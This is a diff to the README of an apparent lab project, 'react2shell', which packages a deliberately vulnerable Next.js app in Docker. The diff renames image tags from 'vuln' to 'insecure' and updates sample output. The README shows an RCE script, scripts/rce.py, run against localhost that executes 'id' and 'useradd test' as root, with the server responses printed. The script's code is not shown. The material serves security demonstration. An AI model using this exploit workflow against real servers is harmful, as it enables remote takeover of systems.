@@ -62,14 +62,12 @@ python ./scripts/rce.py http://localhost:3000 calc
 
 ## Dockerize
 
-The container runs `next dev`, which is required for the exploit to work.
-
 ```sh
 # build the image
-docker build -f app/Dockerfile.vuln -t react2shell:vuln app
+docker build -f app/Dockerfile.insecure -t react2shell:insecure app
 
 # run
-docker run --rm -d --name react2shell -p 3000:3000 react2shell:vuln
+docker run --rm -d --name react2shell-insecure -p 3000:3000 react2shell:insecure
 
 # Exploit vulnerability
 python scripts/rce.py http://localhost:3000 id
@@ -78,26 +76,26 @@ python scripts/rce.py http://localhost:3000 id
 # 0:{"a":"$@1","f":"","b":"development"}
 # 1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
 
+# executable response:
+# uid=0(root) gid=0(root) groups=0(root)
+
 python scripts/rce.py http://localhost:3000 "useradd test"
 # status code: 500
 # response text:
 # 0:{"a":"$@1","f":"","b":"development"}
-# 1:E{"digest":"3289825471","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
-
-# executable response:
-# 3289825471
+# 1:E{"digest":"1271169623","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
 
 python scripts/rce.py http://localhost:3000 "id test"
 # status code: 500
 # response text:
 # 0:{"a":"$@1","f":"","b":"development"}
-# 1:E{"digest":"uid=1005(test) gid=1005(test) groups=1005(test)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
+# 1:E{"digest":"uid=1001(test) gid=1001(test) groups=1001(test)","name":"Error","message":"NEXT_REDIRECT","stack":[],"env":"Server"}
 
 # executable response:
-# uid=1005(test) gid=1005(test) groups=1005(test)
+# uid=1001(test) gid=1001(test) groups=1001(test)
 
-docker rm react2shell -f
-# react2shell
+docker rm react2shell-insecure -f
+# react2shell-insecure
 ```
 
 ---
@@ -106,14 +104,14 @@ docker rm react2shell -f
 
 ```sh
 # build
-docker build -f app/Dockerfile.vuln -t simonangelfong/react2shell:vuln app
+docker build -f app/Dockerfile.insecure -t simonangelfong/react2shell:insecure app
 
 docker login
 # push
-docker push simonangelfong/react2shell:vuln
+docker push simonangelfong/react2shell:insecure
 
 # test
-docker run --rm -d --name react2shell -p 3000:3000 simonangelfong/react2shell:vuln
+docker run --rm -d --name react2shell-insecure -p 3000:3000 simonangelfong/react2shell:insecure
 python scripts/rce.py http://localhost:3000 id
 # status code: 500
 # response text:
@@ -124,6 +122,6 @@ python scripts/rce.py http://localhost:3000 id
 # uid=0(root) gid=0(root) groups=0(root)
 
 # cleanup
-docker rm react2shell -f
-# react2shell
+docker rm react2shell-insecure -f
+# react2shell-insecure
 ```
